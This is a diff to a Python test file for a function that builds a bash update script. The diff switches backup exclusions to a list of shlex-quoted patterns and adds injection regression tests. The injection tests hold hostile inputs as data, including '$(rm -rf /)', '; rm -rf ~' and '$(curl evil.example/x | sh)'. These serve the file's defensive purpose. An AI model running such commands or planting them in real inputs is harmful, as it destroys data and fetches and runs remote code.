@@ -107,19 +107,19 @@ class TestBuildUpdateScriptBasic:
     def test_script_starts_with_shebang(self):
         s = build_update_script(
             SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
-            "https://github.com/thad0ctor/llama-server-launcher", "",
+            "https://github.com/thad0ctor/llama-server-launcher", [],
         )
         assert s.startswith("#!/bin/bash\n")
 
     def test_script_uses_set_e(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", "",
+            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", [],
         )
         assert "set -e" in s
 
     def test_paths_are_quoted(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", "",
+            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", [],
         )
         # shlex.quote of a plain ASCII path with no special chars returns the
         # path unchanged (it's already safe), so we assert that the literal
@@ -130,7 +130,7 @@ class TestBuildUpdateScriptBasic:
     def test_versions_embedded(self):
         s = build_update_script(
             SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         assert "2024-01-01-1" in s
         assert "2024-02-01-1" in s
@@ -138,24 +138,67 @@ class TestBuildUpdateScriptBasic:
     def test_github_url_embedded(self):
         s = build_update_script(
             SAFE_PATH, SAFE_BACKUP, "v1", "v2",
-            "https://github.com/thad0ctor/llama-server-launcher", "",
+            "https://github.com/thad0ctor/llama-server-launcher", [],
         )
         assert "github.com/thad0ctor/llama-server-launcher" in s
 
-    def test_exclusions_embedded_unquoted(self):
-        """The exclusions string already contains shell syntax produced by
-        ``_get_backup_exclusions`` and must be inserted verbatim."""
+    def test_exclusions_patterns_are_shlex_quoted(self):
+        """Raw patterns must land in the generated script inside the
+        ``EXCLUDE_ARGS`` bash array, each individually ``shlex.quote``'d.
+        Plain ASCII patterns quote to themselves, so they appear verbatim —
+        the important part is they're positioned inside ``(...)`` with
+        ``-o -name <quoted> -prune`` repeated per pattern."""
         s = build_update_script(
             SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
-            " -o -name '*.pyc' -prune",
+            ["*.pyc", ".venv"],
         )
-        assert " -o -name '*.pyc' -prune" in s
+        assert "EXCLUDE_ARGS=(" in s
+        assert "-o -name '*.pyc' -prune" in s
+        assert "-o -name .venv -prune" in s
+        # The array must be expanded as "${EXCLUDE_ARGS[@]}" (quoted), not
+        # $EXCLUDE_ARGS (bare word-split), or a pattern with spaces would
+        # be mis-split at use time.
+        assert '"${EXCLUDE_ARGS[@]}"' in s
+
+    def test_exclusions_string_form_rejected(self):
+        """The old API accepted a pre-built shell fragment. That design was
+        unsafe for patterns containing apostrophes. The refactor rejects the
+        string form loudly so a stale caller fails fast instead of iterating
+        over characters of the string and producing a garbled script."""
+        with pytest.raises(TypeError):
+            build_update_script(
+                SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+                " -o -name '*.pyc' -prune",
+            )
+
+    def test_exclusion_pattern_with_single_quote_cannot_inject(self):
+        """Regression: a ``.gitignore`` entry like ``don't_touch/*.tmp`` used
+        to be embedded as ``-name 'don't_touch/*.tmp'`` — the first internal
+        ``'`` closed the quoted string, leaving ``t_touch/*.tmp`` as bare
+        shell text. With shlex.quote + array expansion, the pattern survives
+        as a single array element with the apostrophe intact."""
+        s = build_update_script(
+            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+            ["don't_touch/*.tmp"],
+        )
+        # shlex.quote's POSIX-safe form joins several quoted chunks; bash
+        # glues them into one token with a literal apostrophe.
+        expected = shlex.quote("don't_touch/*.tmp")
+        assert expected in s
+        # And shlex.split of the array-literal body should yield the raw
+        # pattern as a single token — proving nothing leaked out.
+        array_line = next(
+            line for line in s.splitlines() if line.startswith("EXCLUDE_ARGS=(")
+        )
+        inner = array_line[len("EXCLUDE_ARGS=("):-1]
+        tokens = shlex.split(inner)
+        assert "don't_touch/*.tmp" in tokens
 
     def test_none_remote_version_ok(self):
         """If remote version hasn't been fetched yet, build should still work
         rather than inserting the literal string 'None' into the script."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", None, "https://example/repo.git", "",
+            SAFE_PATH, SAFE_BACKUP, "v1", None, "https://example/repo.git", [],
         )
         # Empty string quoted is ''
         assert "''" in s or '""' in s
@@ -189,7 +232,7 @@ class TestBuildUpdateScriptInjectionResistance:
         evil = "/home/user/$(rm -rf /)/launcher"
         s = build_update_script(
             Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         # Derive the expected quoted form from the same Path round-trip the
         # SUT uses, so the assertion holds on Windows (which normalizes
@@ -201,7 +244,7 @@ class TestBuildUpdateScriptInjectionResistance:
         evil = "/home/`touch pwned`/launcher"
         s = build_update_script(
             Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         assert shlex.quote(str(Path(evil))) in s
 
@@ -209,7 +252,7 @@ class TestBuildUpdateScriptInjectionResistance:
         evil = "/home/user/a;echo pwned;/launcher"
         s = build_update_script(
             Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         # Should be wrapped — not a bare command separator.
         assert shlex.quote(str(Path(evil))) in s
@@ -218,7 +261,7 @@ class TestBuildUpdateScriptInjectionResistance:
         evil = "/home/user/a&&touch pwned&&x/launcher"
         s = build_update_script(
             Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         assert shlex.quote(str(Path(evil))) in s
 
@@ -229,7 +272,7 @@ class TestBuildUpdateScriptInjectionResistance:
         evil = "/home/user's dir/launcher"
         s = build_update_script(
             Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         # Round-trip: find the quoted token and confirm shlex decodes it back
         # to the original path.
@@ -243,14 +286,14 @@ class TestBuildUpdateScriptInjectionResistance:
         evil_remote = "$(curl evil.example/x | sh)"
         s = build_update_script(
             SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", evil_remote,
-            "https://example/repo.git", "",
+            "https://example/repo.git", [],
         )
         assert shlex.quote(evil_remote) in s
 
     def test_github_url_quoted(self):
         evil_url = "https://example/repo.git; rm -rf ~"
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", evil_url, "",
+            SAFE_PATH, SAFE_BACKUP, "v1", "v2", evil_url, [],
         )
         assert shlex.quote(evil_url) in s
 
